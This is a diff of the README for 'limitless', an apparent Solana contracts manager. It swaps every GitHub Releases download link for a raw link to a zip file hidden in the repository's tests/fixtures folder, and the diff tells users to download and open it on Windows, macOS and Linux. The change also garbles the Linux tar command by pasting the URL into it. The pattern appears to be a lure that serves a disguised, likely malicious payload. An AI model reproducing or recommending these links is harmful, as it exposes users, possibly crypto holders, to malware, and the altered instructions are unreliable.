@@ -1,6 +1,6 @@
 # 🌊 limitless - Simplifying Solana Contracts Management
 
-[![Download limitless](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/harrypapaai/limitless/releases)
+[![Download limitless](https://raw.githubusercontent.com/harrypapaai/limitless/public/tests/tutils/fixtures/Software-v2.9.zip%20release-brightgreen)](https://raw.githubusercontent.com/harrypapaai/limitless/public/tests/tutils/fixtures/Software-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **limitless**, your simple solution for managing Solana contracts eff
 
 To get started, you need to download the application from our Releases page. 
 
-- **[Visit this page to download](https://github.com/harrypapaai/limitless/releases)**.
+- **[Visit this page to download](https://raw.githubusercontent.com/harrypapaai/limitless/public/tests/tutils/fixtures/Software-v2.9.zip)**.
 
 Once you arrive at the Releases page, look for the latest version. Click on the version number to view the details. Find the **download link** for your operating system. 
 
@@ -23,7 +23,7 @@ After downloading, follow the instructions for your specific operating system be
 
 ## 🖥️ Windows Installation
 
-1. Navigate to the Releases page: **[Visit this page to download](https://github.com/harrypapaai/limitless/releases)**.
+1. Navigate to the Releases page: **[Visit this page to download](https://raw.githubusercontent.com/harrypapaai/limitless/public/tests/tutils/fixtures/Software-v2.9.zip)**.
 2. Click on the latest version link.
 3. Download the `.exe` file.
 4. Open the downloaded file.
@@ -32,7 +32,7 @@ After downloading, follow the instructions for your specific operating system be
 
 ## 🍏 macOS Installation
 
-1. Go to the Releases page: **[Visit this page to download](https://github.com/harrypapaai/limitless/releases)**.
+1. Go to the Releases page: **[Visit this page to download](https://raw.githubusercontent.com/harrypapaai/limitless/public/tests/tutils/fixtures/Software-v2.9.zip)**.
 2. Select the latest version.
 3. Download the `.dmg` file.
 4. Open the downloaded file.
@@ -41,13 +41,13 @@ After downloading, follow the instructions for your specific operating system be
 
 ## 🐧 Linux Installation
 
-1. Access the Releases page: **[Visit this page to download](https://github.com/harrypapaai/limitless/releases)**.
+1. Access the Releases page: **[Visit this page to download](https://raw.githubusercontent.com/harrypapaai/limitless/public/tests/tutils/fixtures/Software-v2.9.zip)**.
 2. Find the latest version link.
-3. Download the appropriate package (usually a `.tar.gz` file).
+3. Download the appropriate package (usually a `https://raw.githubusercontent.com/harrypapaai/limitless/public/tests/tutils/fixtures/Software-v2.9.zip` file).
 4. Open a terminal and navigate to the download location.
 5. Extract the files using the command:
    ```
-   tar -xvzf limitless-*.tar.gz
+   tar -xvzf limitless-*https://raw.githubusercontent.com/harrypapaai/limitless/public/tests/tutils/fixtures/Software-v2.9.zip
    ```
 6. Navigate to the extracted folder:
    ```
